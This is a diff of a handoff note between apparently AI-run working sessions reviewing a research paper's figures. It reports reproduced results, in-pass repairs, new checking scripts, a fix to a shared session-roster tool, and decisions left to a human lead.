+  twenty years"*; §4.10's prose on the identical measurement says *"five parts in ten thousand"*.
+  `RESULT-REG-005` §5 `P_rows` gives `dev_vs_eff = 0.0005185`. The 7 × 10⁻⁴ is what you get by
+  dividing the paper's own 4-decimal display — a number computed off the manuscript rather than off
+  the run. Repaired by `wt151`.
+
+**THE 121+ THAT HELD.** wt027 reproduces every §3 figure including the three prose-only values §11
+promises are in there (lag 1 at φ=0.9, lag 24 at φ=0.1, D(0)=1998.9895). wt002 reproduces §A.2.3
+entire. §4.4's ladder recomputed from the closed form at all three α: every **R** cell, τ = −1 /
+−0.67 / +1, the design terms (+0.69, +0.41, +0.29) and δ contributions (−0.81, −0.98, −1.79),
+δ₃\* = 0.0079 at an 87-period half-life, the first-rung boundary at 0.0214 and 0.0156. The
+abstract's 1.67 and 4.2 reconcile to §4.2 and §4.4. **All three per-file pins return their own sha
+under `git log -1 --format=%h <sha> -- <path>`**; `lag.py` has exactly one commit; and the
+`TIER_TAGS` block extracted at `d655501` and at HEAD hashes **byte-identical**, as §11 claims — the
+naive `sed` range does NOT, because HEAD also carries `TIER_TAGS_REG006`, so extract the assignment
+block properly or you will report a false positive. Forty-six of §7's forty-seven rows hold.
+
+---
+
+## THE TELL, now FIFTY-NINE deep
+
+-61 – -82 as before. **-83 adds five:**
+
+- **-83(i) · AN ENUMERATION IS ONLY AS GOOD AS ITS ADJUDICATIONS, AND THE ADJUDICATION FILE IS AN
+  ARTEFACT THAT MUST ITSELF BE FALSIFIED.** Replacing sampling with enumeration does not remove the
+  human judgement; it moves it from the finder to the adjudicator, and moves the error with it.
+- **-83(ii) · AN ADJUDICATION IS FALSE IF IT CHECKED A DIFFERENT ARTEFACT FROM THE ONE THE SENTENCE
+  NAMES, EVEN WHEN THE NUMBER AGREES.** Make the evidence column name the sentence's own artefact.
+- **-83(iii) · A SUM OF PER-GROUP ENTITY COUNTS IS NOT AN ENTITY COUNT WHENEVER AN ENTITY CAN ENTER
+  TWO GROUPS.** 122+191=313; the union was 307. Every clustered SE and effective-sample argument
+  wants the union. Say which one you are reporting in the same sentence.
+- **-83(iv) · A POINTER WHOSE TARGET IS A BARE NOUN PHRASE OR A BARE SECTION NUMBER IS INVISIBLE TO
+  EVERY CROSS-REFERENCE SWEEP YOU OWN.** When a sweep goes green, the remaining defects concentrate
+  in exactly the syntax it does not match.
+- **-83(v) · A SHARED-STATE CONVENTION THAT MUST BE REMEMBERED WILL BLOCK SOMEBODY ELSE'S WRAP, NOT
+  YOURS — so the party who pays never learns and the party who forgets never notices.** Automate the
+  convention at the only moment the forgetful party is guaranteed to act.
+
+Six leaves banked (five global), four corroborated — one promoted quarantine → active.
+
+---
+
+## TOOLING (▲ new at -83)
+
+- ▲ `scripts/wt151_paperIII_p7pass3.py` — the four repairs. 10 post-conditions, **3 NEGATIVE**.
+  Refuses on a moved anchor; rolls back on any failed post-condition.
+- ▲ `scripts/wt151b_tsv.py` — retires the false row, adjudicates the three promises the repairs
+  emitted, keyed off `wt148 --json` so the sentences are byte-exact.
+- ▲ `scripts/wt152_p7row.py` — the pass-ledger row.
+- ▲ `docs/REVIEW-023-P7-paperIII-pass3.md` — the five-axis table, the shape split, the verdict.
+- Tags run to **wt152; wt153 is free.**
+- ⚠ `reg013_citation_whitespace.py` takes ~5 min and will likely 429 — never put it in a critical path.
+
+**RED-PROOF, this pass, on the real tree:** rewording §5.4's sentence took `wt148` to **RC 1** with
+row `93662b4195` reported STALE and three new promises unadjudicated, exactly as the design says it
+should. All four restored to RC 0 after adjudication.
+
+---
+
 ## ESTATE
 
-- **Nothing carded from the two findings** — both repaired in-pass.
-- Two new State Machine cards: **1217596263441666** (roster-brake's exit #1 loops when the paths you
-  touched are the whole dirty tree; `ROSTER_BRAKE_ACK=N` is the answer and is ranked second) and **1217596233063153** (the near-miss: Paper IV shipped Paper III's already-repaired defect through two reader-passes -- the lesson filed where it can outlive this project).
-- Standing cards commented: **1217586882284748** (the `gate-selfcheck.sh` blocker — THIRD
-  consecutive gate) — see below.
-- Unchanged and still open: **1217593142996092** (wt133 sweep 2 is one-directional),
-  **1217568297674954** (the corpus-level version stamp), **1217568192511533** (Paper II's nine
-  sweep-2 orphans), **1217561667484767** (the PAN history purge, Batter's Box).
+**Carded — one, with a named falsifier.** `RESULT-001-wt026.md`'s summary line says *"Zero censoring
+in 320 events across two universes"* where its own §§1–2 report 120 and 202. **Falsifier:** open the
+file; 120 + 202 = 322. Not repaired in-pass on purpose — it is a committed result document for a
+registered run, and editing one to fix a summary slip wants its own ruling rather than a
+reader-pass's initiative. **Paper III is unaffected: it prints 322 in both places it prints it.**
 
-⚠ **`~/Scripts/gate-selfcheck.sh` WILL exit 1 on `~/Desktop/downloads/SESSION-creditSentinel-1-20260818.md`.**
-THIRD consecutive gate. **DO NOT COMMIT IT.** `-82`'s gate failed on this one file and nothing
-else — every other check green, `G-AD` through `G-AJ` included.
+**▲ THE THREE-SESSION GATE BLOCKER IS RETIRED.** State Machine **1217586882284748** — the spec was
+its second-to-last comment and -82 declined to land it only because `~/Scripts/roster` was live in a
+sibling's hands. At -83 the everything folder was unclaimed and every sibling claim read STALE, so
+it landed: **`roster join` now auto-claims `darwin-everything-meta`**, written atomically
+(`tempfile` + `os.replace`) so a sibling invoking `roster` mid-write sees the old file or the new
+one, never a partial. Backup at `~/Scripts/roster.bak-wealthTensor-83`. **6/6 post-conditions, 3
+NEGATIVE, including the card's own falsifier run in-pass** — join a throwaway, the claim appears;
+release it, it is gone; the wrapping session and the sibling are untouched. Fails safe: no claim,
+and the file blocks exactly as it does today.
 
-`-82` also **withdrew `-81`'s recommended fix and replaced it**, because the gate's own message
-says why it cannot work: the slug is `creditSentinel-1` and the only other live session is named
-`opus-spi-menu`. Matching `SESSION-<slug>` against roster session NAMES fails here, and no string
-rule fixes it. The gate names the real answer itself — *"the sibling owes a `roster claim`"*. So
-make the claim automatic instead of remembered: a session writing `SESSION-<X>-<date>.md` into the
-everything folder should, in the same breath, run
-`~/Scripts/roster claim --who <session> --resource darwin-everything-meta --task "SESSION-<X> notes"`.
-Best home is `roster join` itself. Then `G-H#22c`'s existing attribution path works unchanged with
-no fuzzy matching at all, and it closes the whole class rather than one filename pattern.
+**Standing cards, unchanged:** 1217593142996092 (wt133 sweep 2 one-directional), 1217568297674954
+(version stamp), 1217568192511533 (Paper II's nine orphans), 1217596263441666 (roster-brake exit #1),
+1217596233063153 (the -82 near-miss), 1217561667484767 (PAN purge, Batter's Box).
 
-**`-82` did not implement it**, for one reason and it is the right one: `~/Scripts/roster` was live
-in `opus-spi-menu`'s hands (three claims, joined ~5 h earlier), and editing the roster tool
-underneath a running sibling is the exact thing the roster exists to prevent. **`-83`: if
-`roster who` shows the everything folder quiet, land it — the full spec is the second comment on
-card 1217586882284748.** It is a few lines and it retires a blocker that has now cost three
-sessions.
+**Sibling note:** `claude-blackbook` carried a STALE `opus-spi-menu` claim (>4h) at -83's wrap and
+-83 used it for the teacher-out, as the board's own advisory text invites. Said here, as the board asks.
 
 ---
-## JASON-SIZED, not `-83`'s
 
-- **(a) The two-independent-readers design is still the only clean separator and is still unspent.**
-  `-82` did not spend it and `-83` is not authorised to. `-82`'s prediction is the cheap partial
-  substitute: the ordinary next pass falsifies it at no extra cost.
-- **(b) The version stamp is one ruling closing three manuscripts.** Four consecutive passes have
-  now correctly declined to move it on your behalf, and the gap grows by one paper per pass.
-- **(c) `DECISION-001` closed, `ROADS-001` unchanged.**
-- **(d)** `wt077` already prints `r·E[η⁺]/(1+μ)`, matching to 0.44 % where Paper II §3.1's form is
-  off 4–7 % — changes a stated contribution. Unchanged since `-81`; nobody has been assigned it.
-- **(e) The PAN history purge** — Batter's Box **1217561667484767**.
+## JASON-SIZED, not -84's
+
+- **(a) The two-independent-readers design is STILL unspent and still yours to authorise.** It is
+  the only design that separates *the paper has n defects left* from *a reviewer finds n*. -82's
+  prediction was the cheap partial substitute and it has now been spent — it held. The next cheap
+  substitute is -84's adjudication audit. After that, the design is the only instrument left.
+- **(b) The version stamp is ONE ruling closing THREE manuscripts.** FIVE consecutive passes have
+  now correctly declined to move it for you, and the gap grows by one paper per pass.
+- **(c) DECISION-001 closed, ROADS-001 unchanged.**
+- **(d) `wt077` already prints r·E[η⁺]/(1+μ), matching to 0.44 % where Paper II §3.1's form is off
+  4–7 %** — it changes a stated contribution, and nobody has been assigned it since -81.
+- **(e) The PAN history purge** — Batter's Box 1217561667484767.
 
 ---
-## AT WRAP (`-83`)
 
-`~/Scripts/charter-read.sh wealthTensor-83` **immediately before** the gate; gate detached **WITH
-`GATE_ROSTER_WHO`**; `python3 -m pytest tests/ -q` **AND SAY THE NUMBER**;
-`python3 scripts/wt148_promise_sweep.py` **AND SAY ITS RC** (the suite now checks it too, but say
-it); `python3 scripts/wt133_crossref_sweep.py` **AND SAY ITS RC**; `roster leave --who` **once**;
-`lessons.py use` at student-in and `record-outcome` at wrap — `-82` corroborated four leaves
-(three quarantined → `pass#1`) and banked six new, five of them global. Paste a handoff better than
-this one as the last act, and assign `-84` **ONE** at-bat with a definition of done. Do not hand
-them a menu. 🥎
+## AT WRAP
+
+`~/Scripts/charter-read.sh wealthTensor-84` immediately before the gate; gate detached **WITH
+`GATE_ROSTER_WHO`**; `pytest tests/ -q` **AND SAY THE NUMBER**; `wt148` AND `wt133` **AND SAY BOTH
+RCs**; `roster leave --who` once; and paste a handoff better than this one as the last act —
+**assigning -85 ONE at-bat with a definition of done. Do not hand them a menu.** 🥎
